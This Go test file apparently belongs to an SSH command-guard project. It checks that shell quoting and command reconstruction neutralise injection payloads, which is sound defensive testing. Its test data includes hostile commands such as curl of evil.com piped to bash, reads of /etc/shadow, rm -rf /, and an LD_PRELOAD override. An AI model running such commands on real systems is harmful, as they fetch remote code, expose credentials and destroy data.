package ssh

// Security attack-vector tests for the reconstruction layer.
//
// Each test targets a specific class of injection or bypass. The tests
// exercise ShellQuote and ReconstructCommand directly — the Pipeline struct
// is constructed by hand so we can test reconstruction in isolation from the
// parser/validator (which are earlier lines of defense).
//
// Naming: TestSec_<VectorCategory>_<Specific>

import (
	"strings"
	"testing"

	"github.com/jonchun/shellguard/parser"
)

// assertQuoted checks that the given substring appears wrapped in single
// quotes in the reconstructed command (meaning it was neutralised).
func assertQuoted(t *testing.T, got, dangerous string) {
	t.Helper()
	// The dangerous value must appear inside single quotes in the output.
	// ShellQuote wraps with '...', so we look for the value between quotes,
	// accounting for embedded-single-quote escaping.
	quoted := ShellQuote(dangerous)
	if !strings.Contains(got, quoted) {
		t.Errorf("expected dangerous value to be quoted as %q in output %q", quoted, got)
	}
}

// assertNoUnquoted verifies that a dangerous literal does not appear as a
// bare (unquoted) substring that could be interpreted by the shell.
func assertNoUnquoted(t *testing.T, got, dangerous string) {
	t.Helper()
	// Remove all single-quoted regions and check the dangerous string is absent.
	stripped := stripSingleQuoted(got)
	if strings.Contains(stripped, dangerous) {
		t.Errorf("dangerous value %q appears unquoted in %q (stripped: %q)", dangerous, got, stripped)
	}
}

// stripSingleQuoted removes all single-quoted regions (including the
// '"'"' escape sequences) to leave only unquoted shell text.
func stripSingleQuoted(s string) string {
	var b strings.Builder
	inQuote := false
	for i := 0; i < len(s); i++ {
		if s[i] == '\'' {
			inQuote = !inQuote
			continue
		}
		if s[i] == '"' && !inQuote {
			// Skip the '"'"' escape pattern: we're at the " in '"'"'
			// Just skip the double-quoted region.
			j := i + 1
			for j < len(s) && s[j] != '"' {
				j++
			}
			i = j // skip closing "
			continue
		}
		if !inQuote {
			b.WriteByte(s[i])
		}
	}
	return b.String()
}

// isBalancedSingleQuoted checks that single quotes are balanced in the
// string, accounting for the '"'"' escape pattern.
func isBalancedSingleQuoted(s string) bool {
	inSingle := false
	inDouble := false
	for i := 0; i < len(s); i++ {
		ch := s[i]
		switch {
		case ch == '\'' && !inDouble:
			inSingle = !inSingle
		case ch == '"' && !inSingle:
			inDouble = !inDouble
		}
	}
	return !inSingle && !inDouble
}

// VECTOR 1: ShellQuote bypass — classic injection payloads

func TestSec_ShellQuote_CommandSubstitution(t *testing.T) {
	// Attack: embed $(cmd) in an argument to execute arbitrary commands.
	// Expected: ShellQuote wraps in single quotes; $() is literal inside ''.
	for _, payload := range []string{
		"$(id)",
		"$(cat /etc/shadow)",
		"$(curl http://evil.com | bash)",
		"hello$(rm -rf /)world",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_BacktickSubstitution(t *testing.T) {
	// Attack: backtick command substitution.
	for _, payload := range []string{
		"`id`",
		"`rm -rf /`",
		"hello`whoami`world",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_SemicolonChaining(t *testing.T) {
	// Attack: semicolons to chain commands.
	for _, payload := range []string{
		"; rm -rf /",
		"foo; echo pwned",
		"x;y;z",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_Redirections(t *testing.T) {
	// Attack: inject file redirections.
	for _, payload := range []string{
		"> /etc/passwd",
		">> /etc/crontab",
		"< /dev/urandom",
		"2>&1",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_PipeAndLogicalOps(t *testing.T) {
	// Attack: inject pipes/logical operators in a single token.
	for _, payload := range []string{
		"| rm -rf /",
		"&& curl evil.com",
		"|| wget evil.com",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_GlobAndBraceExpansion(t *testing.T) {
	// Attack: glob patterns or brace expansion that could match unintended files.
	for _, payload := range []string{
		"*.log",
		"/etc/*",
		"?",
		"[a-z]",
		"{a,b,c}",
		"/tmp/{foo,bar}",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_VariableExpansion(t *testing.T) {
	// Attack: shell variable expansion.
	for _, payload := range []string{
		"$HOME",
		"${PATH}",
		"$USER",
		"${IFS}",
		"$0",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — not single-quoted", payload, got)
		}
	}
}

func TestSec_ShellQuote_TildeExpansion(t *testing.T) {
	// Attack: ~ expands to $HOME in bash when unquoted.
	for _, payload := range []string{
		"~",
		"~/secrets",
		"~root",
		"~root/.ssh/id_rsa",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — ~ must be quoted to prevent expansion", payload, got)
		}
	}
}

func TestSec_ShellQuote_HistoryExpansion(t *testing.T) {
	// Attack: ! triggers history expansion in interactive bash. Non-interactive
	// SSH sessions don't expand history, but defense-in-depth: quote it anyway.
	for _, payload := range []string{
		"!",
		"!!",
		"!-1",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — ! must be quoted", payload, got)
		}
	}
}

// VECTOR 2: Null bytes

func TestSec_ShellQuote_NullByteInToken(t *testing.T) {
	// Attack: null bytes (\x00) in a token. In C, nulls terminate strings
	// and could truncate the quoted region. In Go, strings carry length so
	// the null is embedded. Bash strips null bytes from its input, so the
	// quoted content minus the null still forms a valid single-quoted string.
	//
	// Verify: ShellQuote wraps the entire value including the null byte
	// region in quotes, so stripping the null doesn't break quoting.
	cases := []struct {
		name  string
		input string
	}{
		{"null_mid", "hello\x00world"},
		{"null_before_quote", "hello\x00'world"},
		{"null_after_quote", "he'llo\x00world"},
		{"null_with_semicolon", "safe\x00; rm -rf /"},
		{"null_with_subst", "safe\x00$(id)"},
		{"only_null", "\x00"},
		{"null_at_start", "\x00dangerous"},
		{"null_at_end", "safe\x00"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ShellQuote(tc.input)
			// Must be quoted (null byte is not in isSafeShellToken's allowed set).
			if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
				t.Errorf("ShellQuote(%q) = %q — must be single-quoted", tc.input, got)
			}
			// After stripping null bytes (simulating what bash does), the
			// result must still be a properly balanced single-quoted string.
			stripped := strings.ReplaceAll(got, "\x00", "")
			if !isBalancedSingleQuoted(stripped) {
				t.Errorf("after null-stripping, %q has unbalanced quotes", stripped)
			}
		})
	}
}

// VECTOR 3: Backslash sequences inside single quotes

func TestSec_ShellQuote_BackslashSequences(t *testing.T) {
	// In bash single quotes, backslash is NOT an escape character.
	// '\n' is literally backslash-n, not a newline. Verify ShellQuote
	// handles these without introducing interpretation.
	for _, payload := range []string{
		`\n`,
		`\t`,
		`\\`,
		`\r`,
		`\0`,
		`\\\\`,
		`hello\nworld`,
	} {
		got := ShellQuote(payload)
		// Backslash is not in the safe set, so these must be quoted.
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — backslashes must be quoted", payload, got)
		}
	}
}

// VECTOR 4: Actual newline/tab/CR bytes inside tokens

func TestSec_ShellQuote_RealNewlineInToken(t *testing.T) {
	// Attack: a literal newline character inside a token value. If it appeared
	// OUTSIDE quotes, it would act as a command separator. Inside single quotes
	// in bash, newlines are literal and safe.
	cases := []struct {
		name  string
		input string
	}{
		{"simple_newline", "line1\nline2"},
		{"newline_with_cmd", "safe\nrm -rf /"},
		{"newline_with_semicolon", "safe\n; echo pwned"},
		{"carriage_return", "safe\recho pwned"},
		{"crlf", "safe\r\necho pwned"},
		{"tab", "col1\tcol2"},
		{"multiple_newlines", "a\n\n\nb"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ShellQuote(tc.input)
			// Must be quoted.
			if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
				t.Errorf("ShellQuote(%q) = %q — must be single-quoted", tc.input, got)
			}
			// The newline/CR/tab must be INSIDE the quotes, not outside.
			assertNoUnquoted(t, got, "\n")
		})
	}
}

func TestSec_Reconstruct_NewlineInArg(t *testing.T) {
	// End-to-end: a newline embedded in an argument must not create a
	// multi-line command where the second line runs independently.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "grep", Args: []string{"safe\nrm -rf /", "/var/log/syslog"}},
	}}
	got := ReconstructCommand(p, false, false)
	// "rm -rf /" must not appear unquoted.
	assertNoUnquoted(t, got, "rm -rf /")
}

// VECTOR 5: isSafeShellToken bypass — dangerous allowed characters

func TestSec_SafeToken_ColonAsCommand(t *testing.T) {
	// Attack: ":" is the bash null/true command. isSafeShellToken(":") returns
	// true, so it passes through unquoted. If the validator allows a command
	// named ":", it becomes a valid no-op command. This is a validator concern
	// (it must not whitelist ":"), but we verify reconstruction behavior.
	got := ShellQuote(":")
	// ":" is in the safe set, so it passes through unquoted — by design.
	if got != ":" {
		t.Fatalf("ShellQuote(':') = %q, expected ':'", got)
	}

	// Reconstruct with ":" as the command.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: ":", Args: []string{"ignored", "arguments"}},
	}}
	result := ReconstructCommand(p, false, false)
	// The result IS ": ignored arguments" which bash executes as a no-op.
	// This is safe (no side effects) but the validator must block it.
	if !strings.HasPrefix(result, ": ") {
		t.Fatalf("expected colon command, got %q", result)
	}
}

func TestSec_SafeToken_EqualsAssignment(t *testing.T) {
	// Attack: a token like "PATH=/evil/bin" passes isSafeShellToken because
	// all characters (letters, =, /) are in the allowed set. If this appears
	// as a Command, bash interprets it as a variable assignment.
	//
	// The PARSER catches this (mvdan/sh sees FOO=bar as an Assign, not a
	// CallExpr), but reconstruction doesn't add its own defense.
	//
	// Verify: ShellQuote passes it through unquoted.
	cases := []string{
		"PATH=/evil/bin",
		"LD_PRELOAD=/tmp/evil.so",
		"FOO=bar",
		"HOME=/tmp",
	}
	for _, payload := range cases {
		got := ShellQuote(payload)
		// All chars are in safe set, so it passes unquoted.
		if got != payload {
			t.Errorf("ShellQuote(%q) = %q — expected passthrough", payload, got)
		}
	}

	// End-to-end: if such a token becomes the Command, it's a bare assignment.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "PATH=/evil/bin", Args: []string{"ls"}},
	}}
	result := ReconstructCommand(p, false, false)
	// Result is "PATH=/evil/bin ls" — a valid assignment+command in bash.
	// Reconstruction doesn't prevent this; it relies on the parser.
	if !strings.HasPrefix(result, "PATH=/evil/bin ") {
		t.Fatalf("expected assignment pattern, got %q", result)
	}
}

func TestSec_SafeToken_DashDash(t *testing.T) {
	// Attack: "--" as an argument signals end-of-options to many commands.
	// An attacker could inject "--" before a path argument to change how
	// subsequent args are parsed by the target command.
	// isSafeShellToken("--") returns true (- is in the allowed set).
	// This is a semantic attack, not a shell injection. Verify it passes through.
	got := ShellQuote("--")
	if got != "--" {
		t.Fatalf("ShellQuote('--') = %q", got)
	}
}

func TestSec_SafeToken_DotSlashExecution(t *testing.T) {
	// Attack: "./malicious" as a command is valid relative path execution.
	// All chars (., /) are in the safe set.
	got := ShellQuote("./malicious")
	if got != "./malicious" {
		t.Fatalf("ShellQuote('./malicious') = %q", got)
	}
}

func TestSec_SafeToken_AtSign(t *testing.T) {
	// Attack: "@" is in the safe set. In bash, $@ expands to all positional
	// parameters, but bare "@" is not special. Verify it's safe.
	got := ShellQuote("@")
	if got != "@" {
		t.Fatalf("ShellQuote('@') = %q", got)
	}
	// "user@host" — safe.
	got = ShellQuote("user@host")
	if got != "user@host" {
		t.Fatalf("ShellQuote('user@host') = %q", got)
	}
}

func TestSec_SafeToken_PercentSign(t *testing.T) {
	// "%" is in the safe set. In bash, %% is used in parameter expansion
	// ${var%%pattern} but bare "%" is not special outside that context.
	got := ShellQuote("100%")
	if got != "100%" {
		t.Fatalf("ShellQuote('100%%') = %q", got)
	}
}

// VECTOR 6: Operator injection (TOCTOU/struct manipulation)

func TestSec_OperatorInjection_ArbitraryOperator(t *testing.T) {
	// Attack: the Operator field is injected into the output verbatim.
	// The parser only produces "", "|", "&&", "||", but the Pipeline struct
	// is public. If any code between parse and reconstruct sets Operator to
	// a crafted value, it's injected raw.
	//
	// This is a TOCTOU/defense-in-depth concern. Reconstruction trusts the
	// Operator field completely.
	maliciousOps := []struct {
		name     string
		operator string
	}{
		{"semicolon", "; rm -rf / ;"},
		{"newline", "\n"},
		{"subshell", "$( curl evil.com )"},
		{"backtick", "`id`"},
		{"ampersand", "&"},
	}
	for _, tc := range maliciousOps {
		t.Run(tc.name, func(t *testing.T) {
			p := &parser.Pipeline{Segments: []parser.PipelineSegment{
				{Command: "echo", Args: []string{"safe"}},
				{Command: "head", Operator: tc.operator},
			}}
			got := ReconstructCommand(p, false, false)
			// The malicious operator IS injected raw — this is a known
			// weakness in reconstruction. The parser is the defense.
			// We document this: reconstruction MUST only receive operator
			// values produced by the parser.
			if !strings.Contains(got, tc.operator) {
				t.Fatalf("expected operator %q in output %q", tc.operator, got)
			}
		})
	}
}

// VECTOR 7: Prefix interaction attacks

func TestSec_Prefix_PSQLArgInteraction(t *testing.T) {
	// When isPSQL=true, the prefix PGOPTIONS='...' is prepended.
	// If the first command arg resembles an env var override, does the
	// combination create a double-assignment or override PGOPTIONS?
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "psql", Args: []string{"-c", "SELECT 1"}},
	}}
	got := ReconstructCommand(p, true, false)
	// Verify PGOPTIONS prefix is present and the -c arg is properly quoted.
	if !strings.Contains(got, "PGOPTIONS=") {
		t.Fatalf("missing PGOPTIONS prefix in %q", got)
	}
	if !strings.Contains(got, "'SELECT 1'") {
		t.Fatalf("SELECT 1 not properly quoted in %q", got)
	}
}

func TestSec_Prefix_PATHOverrideInArg(t *testing.T) {
	// Attack: if an arg contains PATH=..., could it override the prefix?
	// No — in "PATH=a PATH=b cmd", the last PATH= wins, but args after the
	// command name are arguments, not assignments.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "ls", Args: []string{"PATH=/evil/bin"}},
	}}
	got := ReconstructCommand(p, false, true)
	// PATH=/evil/bin is an argument to ls, not an assignment, because it
	// comes AFTER the command name. isSafeShellToken passes it through
	// unquoted, but it's in arg position.
	if !strings.Contains(got, "PATH=$HOME/.shellguard/bin:$PATH") {
		t.Fatalf("missing toolkit PATH prefix in %q", got)
	}
	// Verify the arg is present.
	if !strings.Contains(got, "PATH=/evil/bin") {
		t.Fatalf("expected arg in output %q", got)
	}
}

func TestSec_Prefix_BothPrefixesOrdering(t *testing.T) {
	// Verify the ordering is stable: PATH first, then PGOPTIONS.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "psql", Args: []string{"-c", "SELECT 1"}},
	}}
	got := ReconstructCommand(p, true, true)
	pathIdx := strings.Index(got, "PATH=")
	pgoIdx := strings.Index(got, "PGOPTIONS=")
	if pathIdx < 0 || pgoIdx < 0 {
		t.Fatalf("missing prefixes in %q", got)
	}
	if pathIdx >= pgoIdx {
		t.Fatalf("PATH prefix must come before PGOPTIONS, got %q", got)
	}
}

// VECTOR 8: Empty and whitespace-only tokens

func TestSec_ShellQuote_EmptyString(t *testing.T) {
	// Empty string must produce '' so bash sees an empty argument, not nothing.
	got := ShellQuote("")
	if got != "''" {
		t.Fatalf("ShellQuote('') = %q, want ''", got)
	}
}

func TestSec_ShellQuote_WhitespaceOnly(t *testing.T) {
	// Whitespace-only tokens must be quoted to preserve them as arguments.
	for _, payload := range []string{" ", "  ", "\t", "\n", " \t\n "} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — whitespace must be quoted", payload, got)
		}
	}
}

func TestSec_Reconstruct_EmptyArg(t *testing.T) {
	// Args list containing empty strings: each must become '' in the output
	// so they're preserved as discrete empty arguments.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "grep", Args: []string{"", "file"}},
	}}
	got := ReconstructCommand(p, false, false)
	if !strings.Contains(got, "grep '' file") {
		t.Fatalf("expected empty arg preserved as '', got %q", got)
	}
}

// VECTOR 9: Multiple embedded single quotes

func TestSec_ShellQuote_MultipleSingleQuotes(t *testing.T) {
	// Stress test the '"'"' escaping with multiple/consecutive single quotes.
	cases := []struct {
		name  string
		input string
		// After bash interprets the ShellQuote output, we should get
		// back the original input.
	}{
		{"one_quote", "'"},
		{"two_quotes", "''"},
		{"three_quotes", "'''"},
		{"quotes_with_text", "it's a 'test' here"},
		{"start_with_quote", "'hello"},
		{"end_with_quote", "hello'"},
		{"only_quotes", "'''''"},
		{"alternating", "a'b'c'd'e"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ShellQuote(tc.input)
			if !isBalancedSingleQuoted(got) {
				t.Errorf("ShellQuote(%q) = %q — unbalanced quotes", tc.input, got)
			}
			// Verify the output starts and ends with a single quote.
			if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
				t.Errorf("ShellQuote(%q) = %q — must be wrapped in single quotes", tc.input, got)
			}
		})
	}
}

// VECTOR 10: Unicode and multi-byte characters

func TestSec_ShellQuote_Unicode(t *testing.T) {
	// Unicode characters are not in isSafeShellToken's ASCII-only set,
	// so they should always be quoted.
	for _, payload := range []string{
		"héllo",
		"日本語",
		"emoji😀",
		"\u200b", // zero-width space
		"\ufeff", // BOM
		"café",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — unicode must be quoted", payload, got)
		}
	}
}

// VECTOR 11: Long strings

func TestSec_ShellQuote_VeryLongString(t *testing.T) {
	// Verify no truncation or buffer issues with very long tokens.
	// Go has no buffer overflow, but verify the quoting is still correct.
	long := strings.Repeat("A", 100000)
	got := ShellQuote(long)
	// All ASCII alphanumeric, so isSafeShellToken returns true.
	if got != long {
		t.Fatalf("long safe string was modified by ShellQuote")
	}

	// Now with an unsafe char in the middle.
	longUnsafe := strings.Repeat("A", 50000) + "'" + strings.Repeat("B", 50000)
	got = ShellQuote(longUnsafe)
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Fatalf("long unsafe string not quoted")
	}
	if !strings.Contains(got, "'\"'\"'") {
		t.Fatalf("embedded single quote not escaped in long string")
	}
	if !isBalancedSingleQuoted(got) {
		t.Fatalf("unbalanced quotes in long string output")
	}
}

// VECTOR 12: Arguments that look like shell syntax

func TestSec_Reconstruct_ShellSyntaxInArgs(t *testing.T) {
	// Comprehensive test: all common shell injection patterns as arguments.
	// Each must be neutralised by quoting.
	dangerous := []string{
		// Command substitution
		"$(rm -rf /)",
		"`rm -rf /`",
		// Semicolons / command chaining
		"; rm -rf /",
		"foo; bar",
		// Pipes / logical operators
		"| malicious",
		"&& malicious",
		"|| malicious",
		// Background
		"& bg_job",
		// Redirections
		"> /etc/passwd",
		">> /etc/crontab",
		"< /dev/zero",
		"2>/dev/null",
		// Subshell
		"(subshell)",
		// Brace expansion
		"{a,b,c}",
		// Arithmetic
		"$((1+1))",
		// Process substitution
		"<(cat /etc/passwd)",
		">(tee /tmp/log)",
		// History expansion
		"!!",
		"!$",
		// Comment injection
		"# this is a comment",
		"safe # this truncates",
	}
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "echo", Args: dangerous},
	}}
	got := ReconstructCommand(p, false, false)
	for _, d := range dangerous {
		assertQuoted(t, got, d)
	}
}

// VECTOR 13: TOCTOU — struct mutation between validate and reconstruct

func TestSec_TOCTOU_MutatedCommand(t *testing.T) {
	// Simulate: validation saw "ls" but someone mutated Command to "rm"
	// before reconstruction. Reconstruction has no knowledge of what was
	// validated; it just quotes and joins.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "ls", Args: []string{"/tmp"}},
	}}
	// Mutate after "validation".
	p.Segments[0].Command = "rm"
	p.Segments[0].Args = []string{"-rf", "/"}
	got := ReconstructCommand(p, false, false)
	// Reconstruction faithfully produces "rm -rf /" — no defense here.
	// This test documents that reconstruction is NOT a security boundary
	// for struct mutation; immutability must be enforced elsewhere.
	if got != "rm -rf /" {
		t.Fatalf("expected faithfully reconstructed mutated command, got %q", got)
	}
}

func TestSec_TOCTOU_AddedSegment(t *testing.T) {
	// Simulate: after validation, an extra segment is appended.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "ls", Args: []string{"/tmp"}},
	}}
	// Append a malicious segment.
	p.Segments = append(p.Segments, parser.PipelineSegment{
		Command:  "curl",
		Args:     []string{"http://evil.com"},
		Operator: "&&",
	})
	got := ReconstructCommand(p, false, false)
	// Reconstruction includes the appended segment.
	if !strings.Contains(got, "&& curl") {
		t.Fatalf("expected appended segment in output, got %q", got)
	}
}

// VECTOR 14: Nil pipeline and edge cases

func TestSec_Reconstruct_NilPipeline(t *testing.T) {
	if got := ReconstructCommand(nil, false, false); got != "" {
		t.Fatalf("nil pipeline should produce empty string, got %q", got)
	}
}

func TestSec_Reconstruct_EmptySegments(t *testing.T) {
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{}}
	if got := ReconstructCommand(p, false, false); got != "" {
		t.Fatalf("empty segments should produce empty string, got %q", got)
	}
}

func TestSec_Reconstruct_EmptyCommand(t *testing.T) {
	// A segment with an empty Command string.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{Command: "", Args: []string{"arg1"}},
	}}
	got := ReconstructCommand(p, false, false)
	// Empty command should be quoted as ''.
	if !strings.Contains(got, "'' ") {
		t.Fatalf("empty command not quoted as '', got %q", got)
	}
}

// VECTOR 15: Combined attack patterns

func TestSec_Reconstruct_CombinedAttackPayloads(t *testing.T) {
	// Realistic combined attack: multiple injection techniques in a single pipeline.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{
			Command: "grep",
			Args: []string{
				"pattern\n; curl evil.com | bash", // newline + chaining
				"'$(cat /etc/shadow)'",            // single quotes around subst
				"/var/log/`hostname`.log",         // backtick in path
				"--output=>(tee /tmp/exfil)",      // proc subst in flag value
			},
		},
	}}
	got := ReconstructCommand(p, false, false)

	// None of the dangerous payloads should appear unquoted.
	assertNoUnquoted(t, got, "; curl evil.com")
	assertNoUnquoted(t, got, "$(cat /etc/shadow)")
	assertNoUnquoted(t, got, "`hostname`")
	assertNoUnquoted(t, got, ">(tee /tmp/exfil)")
}

func TestSec_Reconstruct_PSQLInjection(t *testing.T) {
	// Attack: psql -c with SQL containing shell metacharacters. The SQL
	// is wrapped in single quotes by ShellQuote, so embedded quotes get
	// the '"'"' treatment.
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{
		{
			Command: "psql",
			Args:    []string{"-c", "SELECT ''; DROP TABLE users; --"},
		},
	}}
	got := ReconstructCommand(p, true, false)
	// The SQL string must be safely quoted.
	assertQuoted(t, got, "SELECT ''; DROP TABLE users; --")
}

// VECTOR 16: isSafeShellToken correctness — boundary chars

func TestSec_IsSafeShellToken_Boundaries(t *testing.T) {
	// Verify every character that should be safe IS safe, and a selection
	// of dangerous characters are NOT safe.
	safe := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@%+=:,./-"
	for _, r := range safe {
		if got := ShellQuote(string(r)); got != string(r) {
			t.Errorf("char %q (U+%04X) should be safe but was quoted as %q", string(r), r, got)
		}
	}

	dangerous := " \t\n\r`~!#$^&*()[]{}|\\;'\"<>?"
	for _, r := range dangerous {
		got := ShellQuote(string(r))
		if got == string(r) {
			t.Errorf("char %q (U+%04X) should NOT be safe but passed through unquoted", string(r), r)
		}
	}
}

// VECTOR 17: ANSI-C escape sequences ($'...')

func TestSec_ShellQuote_DollarSingleQuote(t *testing.T) {
	// Attack: $'...' enables ANSI-C escape interpretation in bash.
	// If a token is literally "$'\\x41'" (the string $'\x41'), it must be quoted.
	for _, payload := range []string{
		"$'hello'",
		"$'\\x41'",
		"$'\\n'",
	} {
		got := ShellQuote(payload)
		// $ is not in the safe set → must be quoted.
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — $-quoting must be neutralised", payload, got)
		}
	}
}

// VECTOR 18: Double-quote edge cases

func TestSec_ShellQuote_DoubleQuoteInteraction(t *testing.T) {
	// The '"'"' pattern uses double quotes. Ensure tokens with literal
	// double quotes don't break the escaping.
	cases := []struct {
		name  string
		input string
	}{
		{"double_then_single", `"it's"`},
		{"nested_quotes", `"hello 'world'"`},
		{"just_double", `"`},
		{"double_with_dollar", `"$HOME"`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ShellQuote(tc.input)
			if !isBalancedSingleQuoted(got) {
				t.Errorf("ShellQuote(%q) = %q — unbalanced quotes", tc.input, got)
			}
		})
	}
}

// VECTOR 19: Prefix with no command (degenerate)

func TestSec_Reconstruct_PrefixOnlyNoSegments(t *testing.T) {
	// What if we request prefixes but there are no segments?
	p := &parser.Pipeline{Segments: []parser.PipelineSegment{}}
	got := ReconstructCommand(p, true, true)
	// Should return empty string — prefixes not emitted without a command.
	if got != "" {
		t.Fatalf("expected empty string for empty pipeline with prefixes, got %q", got)
	}
}

// VECTOR 20: Token that is ONLY special characters

func TestSec_ShellQuote_OnlySpecialChars(t *testing.T) {
	for _, payload := range []string{
		";",
		"|",
		"&",
		"&&",
		"||",
		";;",
		"<",
		">",
		">>",
		"()",
		"{}",
		"$",
		"$$",
		"#",
		"!",
		"\\",
	} {
		got := ShellQuote(payload)
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Errorf("ShellQuote(%q) = %q — must be quoted", payload, got)
		}
	}
}
